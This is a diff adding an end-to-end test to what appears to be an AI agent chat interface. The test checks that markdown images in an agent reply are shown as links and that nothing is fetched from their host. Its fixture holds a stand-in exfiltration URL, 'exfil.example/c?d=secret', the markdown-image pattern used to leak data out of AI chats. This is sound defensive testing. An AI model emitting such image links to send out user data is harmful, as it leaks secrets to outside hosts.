@@ -61,6 +61,30 @@ test("30 a markdown block's committed markup parses to the same DOM as a separat
   expect(blocks.filter((block) => !block.same)).toEqual([])
 })
 
+const REMOTE_MEDIA = [
+  "Read this first ![leaked notes](https://exfil.example/c?d=secret) and this ![host relative](//exfil.example/p.png).",
+  "",
+  "Remote media withheld.",
+].join("\n")
+
+test("30 a remote image in a reply is a link to its source, and nothing is fetched from that host", async ({ stack, api, app }) => {
+  const fetched: string[] = []
+  app.on("request", (request) => {
+    if (new URL(request.url()).hostname === "exfil.example") fetched.push(request.url())
+  })
+  const workspace = await stack.daemon.makeWorkspace("remote-media")
+  await stack.acp.write("remote-media", { steps: [{ kind: "text", text: REMOTE_MEDIA }] })
+  const session = await api.createSession(workspace.directory, { title: "Remote media", harness: SCRIPTED_ACP_HARNESS })
+  await api.prompt(workspace.directory, session.id, `Show the notes. ${acpScriptToken("remote-media")}`)
+  await app.goto(`${stack.url}${sessionRoute(workspace.id, session.id)}`)
+  await expect(app.getByText("Remote media withheld.")).toBeVisible()
+
+  await expect(app.getByRole("link", { name: "leaked notes" })).toHaveAttribute("href", "https://exfil.example/c?d=secret")
+  await expect(app.getByRole("link", { name: "host relative" })).toHaveAttribute("href", /^https?:\/\/exfil\.example\/p\.png$/)
+  await expect(app.getByRole("img", { name: "leaked notes" })).toHaveCount(0)
+  expect(fetched).toEqual([])
+})
+
 test("30 copy response puts the reply's markdown on the clipboard", async ({ stack, api, app, isMobile }) => {
   test.skip(isMobile, "the copy button is revealed by hover")
   await app.context().grantPermissions(["clipboard-read", "clipboard-write"])
